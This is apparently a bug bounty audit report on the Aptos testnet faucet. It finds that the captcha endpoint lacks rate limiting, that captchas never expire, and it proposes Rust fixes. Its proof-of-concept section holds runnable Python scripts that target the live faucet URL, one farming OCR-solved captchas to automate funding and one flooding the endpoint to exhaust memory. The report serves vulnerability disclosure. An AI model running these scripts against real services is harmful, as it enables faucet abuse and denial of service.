# Audit Report

## Title
Captcha Farming Attack: Unlimited Captcha Request and Indefinite Storage Enables Complete Bypass of Faucet Protection

## Summary
The `/request_captcha` endpoint lacks rate limiting and generated captchas have no expiration time, allowing attackers to request and solve thousands of captchas offline to build a pool of pre-solved solutions for later automated faucet abuse.

## Finding Description

The Aptos faucet's captcha system contains two critical security flaws that, when combined, allow attackers to completely bypass the intended captcha protection:

**Flaw 1: No Rate Limiting on Captcha Generation**

The `request_captcha()` endpoint creates new captcha challenges without any rate limiting mechanism [1](#0-0) . Unlike the `/fund` endpoint which applies checkers including `RedisRatelimitChecker` [2](#0-1) , the captcha endpoint directly calls `captcha_manager.create_challenge()` without any protective measures.

**Flaw 2: Captchas Never Expire**

The `CaptchaManager` stores captcha solutions in a simple `HashMap<u32, String>` without any timestamp or TTL mechanism [3](#0-2) . When a captcha is created, it remains valid indefinitely until successfully used [4](#0-3) . The `check_challenge()` method only removes captchas on correct answers, leaving incorrect or unused captchas in memory forever [5](#0-4) .

Notably, the code contains a warning comment explicitly acknowledging this vulnerability [6](#0-5) .

**Attack Execution Path:**

1. Attacker sends thousands of HTTP GET requests to `/request_captcha`
2. Each request returns a unique `(key, image)` pair via the `CAPTCHA_KEY` header and image body
3. Attacker stores all key-image pairs locally
4. Attacker uses OCR/ML services (commercial or open-source) to solve all captchas offline in parallel
5. Attacker now possesses a pool of valid `(key, solution)` pairs that remain valid indefinitely
6. Attacker uses pre-solved captchas to make automated `/fund` requests, bypassing captcha protection entirely
7. Process can be repeated indefinitely to maintain a fresh pool of solved captchas

**Security Guarantee Violated:**

The captcha system exists to enforce the invariant: "Only human users can access the faucet at human-limited rates." This vulnerability allows automated scripts to bypass this protection completely, enabling unlimited automated faucet abuse at machine speed.

## Impact Explanation

This vulnerability qualifies as **High Severity** under Aptos bug bounty criteria for the following reasons:

1. **API Crashes**: Unlimited captcha generation can cause the faucet server to run out of memory (OOM), crashing the API service. This directly matches the "API crashes" criterion for High severity.

2. **Resource Exhaustion DoS**: The in-memory HashMap grows unbounded as attackers request captchas, eventually consuming all available server memory and causing service disruption.

3. **Complete Protection Bypass**: The captcha mechanism becomes entirely ineffective, allowing attackers to drain faucet funds through automated scripts, undermining the faucet's operational security.

4. **Testnet Infrastructure Impact**: While the faucet is not part of core consensus, it is critical infrastructure for testnet operations. Faucet unavailability prevents developers from testing applications, impacting the ecosystem.

## Likelihood Explanation

**Likelihood: Very High**

This attack is trivial to execute:

- **Technical Complexity**: Low - requires only basic HTTP client scripting
- **Prerequisites**: None - no authentication or special access required
- **Cost**: Minimal - OCR services are cheap or free (Tesseract, cloud OCR APIs)
- **Detection Difficulty**: Hard to distinguish from legitimate heavy usage without rate limiting
- **Captcha Complexity**: The 5-character captchas with filters are easily solvable by modern ML models

The attack can be executed immediately by any attacker with basic programming skills. The lack of any defensive measures makes exploitation straightforward and reliable.

## Recommendation

Implement three defensive layers:

**1. Add Rate Limiting to Captcha Endpoint**

Apply the existing `RedisRatelimitChecker` or create an IP-based rate limiter for `/request_captcha`:
- Limit captcha requests to 10-20 per IP per hour
- Use the same Redis-based tracking as the `/fund` endpoint
- Return 429 status with `Retry-After` header when limit exceeded

**2. Implement Captcha Expiration**

Modify `CaptchaManager` to store timestamps and enforce TTL:

```rust
pub struct CaptchaManager {
    // Store (solution, timestamp)
    challenges: HashMap<u32, (String, u64)>,
    captcha_ttl_seconds: u64,  // e.g., 300 seconds (5 minutes)
}

pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
    match self.challenges.get(&key) {
        Some((captcha, created_at)) => {
            let now = get_current_time_secs();
            if now - created_at > self.captcha_ttl_seconds {
                self.challenges.remove(&key);
                bail!("Captcha expired");
            }
            // ... rest of validation
        },
        None => bail!("Captcha key unknown: {}", key),
    }
}
```

**3. Implement Periodic Cleanup**

Add background task to remove expired captchas:

```rust
pub fn cleanup_expired(&mut self) {
    let now = get_current_time_secs();
    self.challenges.retain(|_, (_, created_at)| {
        now - created_at <= self.captcha_ttl_seconds
    });
}
```

**4. Add Maximum Pool Size Limit**

Reject new captcha requests if the HashMap exceeds a reasonable size (e.g., 10,000 entries) to prevent OOM even if cleanup fails.

## Proof of Concept

**Exploitation Script (Python):**

```python
#!/usr/bin/env python3
import requests
import base64
from PIL import Image
import pytesseract
from io import BytesIO
import time

FAUCET_URL = "https://faucet.testnet.aptoslabs.com"
CAPTCHA_POOL = []

def farm_captchas(count=1000):
    """Request and solve captchas to build a pool"""
    for i in range(count):
        try:
            # Request captcha
            resp = requests.get(f"{FAUCET_URL}/v1/request_captcha")
            if resp.status_code == 200:
                captcha_key = resp.headers.get("CAPTCHA_KEY")
                image_data = resp.content
                
                # Solve captcha using OCR
                image = Image.open(BytesIO(image_data))
                solution = pytesseract.image_to_string(image, config='--psm 7').strip()
                
                # Store for later use
                CAPTCHA_POOL.append((captcha_key, solution))
                print(f"[{i+1}/{count}] Solved captcha: key={captcha_key}")
            
            time.sleep(0.1)  # Avoid overwhelming server (no rate limit exists)
        except Exception as e:
            print(f"Error: {e}")
    
    print(f"\nFarmed {len(CAPTCHA_POOL)} valid captchas")
    return CAPTCHA_POOL

def abuse_faucet_with_pool():
    """Use pre-solved captchas to automate faucet requests"""
    for captcha_key, solution in CAPTCHA_POOL:
        headers = {
            "CAPTCHA_KEY": captcha_key,
            "CAPTCHA_VALUE": solution
        }
        fund_data = {
            "address": "0x1234567890abcdef"  # Attacker's address
        }
        
        resp = requests.post(
            f"{FAUCET_URL}/v1/fund",
            json=fund_data,
            headers=headers
        )
        
        if resp.status_code == 200:
            print(f"Successfully funded using pre-solved captcha {captcha_key}")
        
        time.sleep(1)  # Respect daily rate limit while using pre-solved captchas

# Build pool of 1000 pre-solved captchas
farm_captchas(1000)

# Use pool over time to bypass captcha protection
abuse_faucet_with_pool()
```

**Memory Exhaustion PoC:**

```python
#!/usr/bin/env python3
import requests
import concurrent.futures

def request_captcha(_):
    requests.get("https://faucet.testnet.aptoslabs.com/v1/request_captcha")

# Request 100,000 captchas concurrently to exhaust server memory
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    executor.map(request_captcha, range(100000))
```

**Expected Result:** 
- First script builds unlimited pool of valid captchas that never expire
- Second script causes faucet server OOM crash due to unbounded HashMap growth
- Captchas remain valid indefinitely, allowing attacker to automate faucet abuse

## Notes

This vulnerability undermines the entire purpose of the captcha system. While the faucet is not part of the core Aptos blockchain consensus mechanism, it is critical testnet infrastructure. The developers appear to be aware of the OOM risk based on the warning comment, but have not implemented mitigations for either the memory exhaustion or the captcha farming attack vectors.

The combination of no rate limiting and no expiration creates a perfect storm where attackers can stockpile unlimited valid captchas and use them to completely bypass the human verification requirement at their convenience.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L40-58)
```rust
    async fn request_captcha(&self) -> Result<Response<Binary<Vec<u8>>>, AptosTapErrorResponse> {
        if !self.enabled {
            return Err(AptosTapError::new(
                "The CaptchaChecker is not enabled".to_string(),
                AptosTapErrorCode::EndpointNotEnabled,
            )
            .into());
        }
        let mut captcha_manager = self.captcha_manager.lock().await;
        let (key, image) = match captcha_manager.create_challenge() {
            Ok((key, image)) => (key, image),
            Err(e) => {
                return Err(
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError).into(),
                );
            },
        };
        Ok(Response::new(Binary(image)).header(CAPTCHA_KEY, key))
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L262-270)
```rust
        let mut rejection_reasons = Vec::new();
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L4-6)
```rust
//! Warning: This could be attacked and cause the server to OOM because we
//! don't throw out captchas info if it has been sitting there for too long /
//! the map grows too large.
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L126-131)
```rust
pub struct CaptchaManager {
    /// When a challenge is created, we return to the client the captcha itself
    /// and a random key they must make the second request with. This is a map
    /// from that random key to the value of the captcha.
    challenges: HashMap<u32, String>,
}
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L142-162)
```rust
    pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
        // Generate a random key.
        let key = rand::thread_rng().gen_range(0, u32::MAX - 1);

        // Generate a captcha.
        let (name, image) = Captcha::new()
            .add_chars(5)
            .apply_filter(Noise::new(0.4))
            .apply_filter(Wave::new(4.0, 6.0).vertical())
            .apply_filter(Wave::new(3.0, 2.0).horizontal())
            .apply_filter(Grid::new(10, 6))
            .apply_filter(Dots::new(8))
            .as_tuple()
            .context("Failed to generate captcha")?;

        // Store the captcha information.
        self.challenges.insert(key, name);

        // Return (key, <captcha as base64>).
        Ok((key, image))
    }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L165-177)
```rust
    pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
        match self.challenges.get(&key) {
            Some(captcha) => {
                if captcha == value {
                    self.challenges.remove(&key);
                    Ok(true)
                } else {
                    Ok(false)
                }
            },
            None => bail!("Captcha key unknown: {}", key),
        }
    }
```
